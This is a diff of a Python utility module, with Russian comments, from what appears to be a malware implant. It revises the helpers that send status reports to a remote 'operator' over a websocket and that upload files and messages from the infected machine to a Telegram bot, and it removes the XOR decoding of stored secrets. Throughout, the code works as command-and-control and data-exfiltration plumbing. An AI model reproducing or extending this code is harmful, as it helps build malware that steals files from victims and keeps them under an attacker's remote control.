@@ -1,57 +1,31 @@
-# --- Файл: utils.py (Версия 3.0 с логированием ошибок) ---
-import os
-import requests
-import json
-import asyncio
+# --- Файл: utils.py (ЭТАЛОННАЯ ВЕРСЯ) ---
+import requests, os, asyncio
 import settings
-import implant_config
+from implant_config import TEMP_PATH
 
-TEMP_PATH = implant_config.TEMP_PATH
+def get_secret(encrypted_secret): return encrypted_secret
 
-def get_secret(encrypted_value: str) -> str:
-    key = settings.ENCRYPTION_KEY
-    if not encrypted_value or not key: return ""
-    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(encrypted_value, key * (len(encrypted_value) // len(key) + 1)))
+def send_telegram_message(text):
+    bot_token = get_secret(settings.ENC_TELEGRAM_BOT_TOKEN); chat_id = get_secret(settings.ENC_TELEGRAM_CHAT_ID)
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"; payload = {"chat_id": chat_id, "text": text}
+    try: requests.post(url, json=payload, timeout=10); return True
+    except requests.RequestException: return False
 
-def send_status_to_operator(ws, loop, message, is_error=False):
-    """
-    Отправляет статус оператору. Если is_error=True, форматирует как ошибку.
-    """
-    if ws and not ws.closed and loop:
-        try:
-            # Добавляем эмодзи для наглядности
-            prefix = "❌ " if is_error else "✅ "
-            full_message = f"{prefix}{message}"
-
-            payload_str = json.dumps({'type': 'status', 'data': full_message})
-            coro = ws.send_str(payload_str)
-            asyncio.run_coroutine_threadsafe(coro, loop)
-        except Exception as e:
-            # Эта ошибка будет видна только в локальной консоли импланта (при отладке)
-            print(f"[!] Не удалось отправить статус оператору: {e}")
-
-# Функции для Telegram остаются без изменений.
 def send_telegram_document(file_path, caption=""):
-    bot_token = get_secret(settings.ENC_BOT_TOKEN)
-    chat_id = get_secret(settings.ENC_CHAT_ID)
-    if not bot_token or not chat_id: return False
+    bot_token = get_secret(settings.ENC_TELEGRAM_BOT_TOKEN); chat_id = get_secret(settings.ENC_TELEGRAM_CHAT_ID)
     url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
     try:
         with open(file_path, "rb") as f:
-            files = {'document': (os.path.basename(file_path), f)}
-            data = {'chat_id': chat_id, 'caption': caption}
-            response = requests.post(url, files=files, data=data, timeout=20)
-            return response.status_code == 200
-    except:
-        return False
+            files = {"document": f}; data = {"chat_id": chat_id, "caption": caption}
+            response = requests.post(url, files=files, data=data, timeout=30)
+            return response.json().get("ok", False)
+    except (requests.RequestException, FileNotFoundError): return False
 
-def send_telegram_message(message):
-    bot_token = get_secret(settings.ENC_BOT_TOKEN)
-    chat_id = get_secret(settings.ENC_CHAT_ID)
-    if not bot_token or not chat_id: return
-    import urllib.parse, urllib.request
-    try:
-        url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={urllib.parse.quote_plus(message)}"
-        urllib.request.urlopen(url, timeout=10)
-    except:
-        pass
+def send_status_to_operator(ws, loop, message, is_error=False):
+    if not loop or loop.is_closed(): return
+    payload = {'type': 'status', 'data': f"❌ {message}" if is_error else f"✅ {message}"}
+    async def send_message():
+        if not ws.closed:
+            try: await ws.send_json(payload)
+            except (ConnectionResetError, asyncio.CancelledError): pass
+    asyncio.run_coroutine_threadsafe(send_message(), loop)
